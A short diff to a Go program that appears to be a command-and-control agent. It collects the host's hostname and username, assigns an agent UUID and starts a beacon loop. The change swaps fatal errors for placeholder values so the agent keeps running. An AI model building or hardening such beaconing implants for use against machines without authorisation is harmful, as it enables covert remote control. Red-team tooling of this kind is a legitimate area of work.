@@ -53,9 +53,12 @@ func main() {
 	Agentuuid := uuid.New().String()                         // Agent's uuid generated
 	hostname, err := exec.Command("hostname", "-f").Output() // Agent's hostname
 	if err != nil {
-		log.Fatal(err)
+		hostname = []byte("unknown-host")
 	}
 	user, err := exec.Command("whoami").Output() // Agent's Username
+	if err != nil {
+		user = []byte("unknown-user")
+	}
 
 	for {
 		//First beacon for reqular commands
